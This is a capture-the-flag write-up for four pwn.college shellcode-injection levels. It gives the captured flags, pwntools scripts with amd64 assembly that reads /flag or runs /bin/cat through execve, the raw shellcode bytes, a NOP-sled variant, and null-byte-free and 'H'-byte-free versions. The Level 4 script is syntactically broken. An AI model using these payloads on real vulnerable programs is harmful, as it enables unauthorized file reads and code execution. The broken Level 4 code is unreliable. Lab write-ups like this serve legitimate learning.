# Level 1	

**Flag:** `pwn.college{YvajjOW2LxGo54Yw6pt32rm-9hH.01NxIDL3AjN1czW} `

Approach

- step 1<br>
Referred from what Yan from pwncollege taught in the intro. Wrote the following python script with the assembly code of how I wanna use the sendfile command as per the chal desc.

```
from pwn import *

context.arch='amd64'
context.os='linux'

asmc='''
    mov rax, 0x00000067616c662f         ; /flag
    push rax                            

    mov rdi, rsp                                   
    mov rsi, 0                          
    mov rax, 2                          
    syscall

    mov rdi, rax                        
    mov rsi, rsp                        
    mov rdx, 1000                       
    mov rax, 0                          
    syscall

    mov rdi, 1                          
    mov rsi, rsp                        
    mov rdx, rax                        
    mov rax, 1                          
    syscall

    mov rdi, 40                        
    mov rax, 60                         
    syscall
'''

sc=asm(asmc)
print(sc)
```

- step 1<br>
`
echo -en 'H\xb8/flag\x00\x00\x00PH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H\xc7\xc0\x02\x00\x00\x00\x0f\x05H\x89\xc7H\x89\xe6H\xc7\xc2\xe8\x03\x00\x00H\xc7\xc0\x00\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\x89\xc2H\xc7\xc0\x01\x00\x00\x00\x0f\x05H\xc7\xc7(\x00\x00\x00H\xc7\xc0<\x00\x00\x00\x0f\x05'
` was the shellcode.


<br>
<br>

# Level 2	

**Flag:** `pwn.college{U2m9XCBD29YjCItiC9cjHnlcsod.0FOxIDL3AjN1czW} `

Approach

- step 1<br>
The challenge is the same as before, just that the program skips 2048 lines, so we have to add nop sleds such that the necessary part of the shellcode gets executed.


```
from pwn import *

context.arch='amd64'
context.os='linux'
asmc='''
    .rept 2048
        nop
    .endr
    mov rax, 0x00000067616c662f    ; /flag     
    push rax                            

    mov rdi, rsp                                   
    mov rsi, 0                          
    mov rax, 2                          
    syscall

    mov rdi, rax                        
    mov rsi, rsp                        
    mov rdx, 1000                       
    mov rax, 0                          
    syscall

    mov rdi, 1                          
    mov rsi, rsp                        
    mov rdx, rax                        
    mov rax, 1                          
    syscall

    mov rdi, 40                        
    mov rax, 60                         
    syscall
'''


sc=asm(asmc)
print(sc)


```


<br>
<br>

# Level 3	

**Flag:** `pwn.college{QqlcAkceUM88lJIt4GZV7utuMWO.0VOxIDL3AjN1czW}`

Approach

- step 1<br>
According to the chal, our written shell code must have 0 NULL bytes. I used Shellcraft to make my script which gave me the shellcode to bring about this.I later did some research and found out that I had to give in /bin/cat as an argument to read the flag! 

```
      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000026c95000 | 6a 01                                         | push 1
0x0000000026c95002 | fe 0c 24                                      | dec byte ptr [rsp]
0x0000000026c95005 | 48 b8 2f 62 69 6e 2f 63 61 74                 | movabs rax, 0x7461632f6e69622f
0x0000000026c9500f | 50                                            | push rax
0x0000000026c95010 | 48 89 e7                                      | mov rdi, rsp
0x0000000026c95013 | 48 b8 01 01 01 01 01 01 01 01                 | movabs rax, 0x101010101010101
0x0000000026c9501d | 50                                            | push rax
0x0000000026c9501e | 48 b8 01 2e 67 6d 60 66 01 01                 | movabs rax, 0x10166606d672e01
0x0000000026c95028 | 48 31 04 24                                   | xor qword ptr [rsp], rax
0x0000000026c9502c | 48 b8 2f 62 69 6e 2f 63 61 74                 | movabs rax, 0x7461632f6e69622f
0x0000000026c95036 | 50                                            | push rax
0x0000000026c95037 | 31 f6                                         | xor esi, esi
0x0000000026c95039 | 56                                            | push rsi
0x0000000026c9503a | 6a 11                                         | push 0x11
0x0000000026c9503c | 5e                                            | pop rsi
0x0000000026c9503d | 48 01 e6                                      | add rsi, rsp
0x0000000026c95040 | 56                                            | push rsi
0x0000000026c95041 | 6a 10                                         | push 0x10
0x0000000026c95043 | 5e                                            | pop rsi
0x0000000026c95044 | 48 01 e6                                      | add rsi, rsp
0x0000000026c95047 | 56                                            | push rsi
0x0000000026c95048 | 48 89 e6                                      | mov rsi, rsp
0x0000000026c9504b | 31 d2                                         | xor edx, edx
0x0000000026c9504d | 6a 3b                                         | push 0x3b
0x0000000026c9504f | 58                                            | pop rax
0x0000000026c95050 | 0f 05                                         | syscall
Executing shellcode!

pwn.college{QqlcAkceUM88lJIt4GZV7utuMWO.0VOxIDL3AjN1czW}

```

<br>
<br>

# Level 4	

**Flag:** `pwn.college{coKGrl-mfcOO_yHGIjdgYTuar1j.0FMyIDL3AjN1czW}`

Approach

- step 1<br>
Acc to the chal, the shellcode cant have any 'H' bytes.
I did some research on this and found out the 0x48 byte which is the hex form of H, is an operation code for 64 bit registers. So avoiding the use of 64-bit registers, and using 32-bit registers (starting with e), we can inject our shellcode and get the flag.

```
from pwn import *

context.arch='amd64'
context.os='linux'

asmc = ```
    xor eax, eax
    mov eax, 2
    lea edi, [rip + path]
    xor esi, esi
    syscall
    xor edi, edi
    mov dil, 1
    xor esi, esi
    mov sil, al
    xor edx, edx
    mov r10, 128
    mov al, 40
    syscall
path:
    .string "/flag"```
sc=asm(asmc
print(sc)

```



